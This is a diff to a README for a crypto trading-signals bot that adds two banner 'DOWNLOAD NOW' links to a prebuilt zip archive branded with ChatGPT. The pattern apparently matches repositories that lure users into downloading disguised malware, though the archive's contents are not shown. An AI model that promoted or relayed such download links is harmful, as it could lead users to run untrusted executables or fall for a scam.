@@ -1,4 +1,7 @@
 ![ChatGPT AI Trading Bot](https://github.com/user-attachments/assets/7e7fac88-bd65-47a2-909c-1a3393b2326b)
+************************************
+[DOWNLOAD NOW](https://github.com/JoannePalmer/Cryptomarkets-AI-Signals-Bot/releases/download/Download/ChatGPTAITradingBot.zip)
+************************************
 Program Name: Cryptomarkets AI Signals Bot
 Purpose: Generation of trading signals for cryptocurrency markets using artificial intelligence.
 
@@ -22,3 +25,6 @@ Target Audience
 The Cryptomarkets AI Signals Bot is suitable for both beginners and experienced traders who wish to automate their trading decisions in the cryptocurrency market.
 
 Note: The program does not guarantee profit and is not financial advice.
+************************************
+[DOWNLOAD NOW](https://github.com/JoannePalmer/Cryptomarkets-AI-Signals-Bot/releases/download/Download/ChatGPTAITradingBot.zip)
+************************************
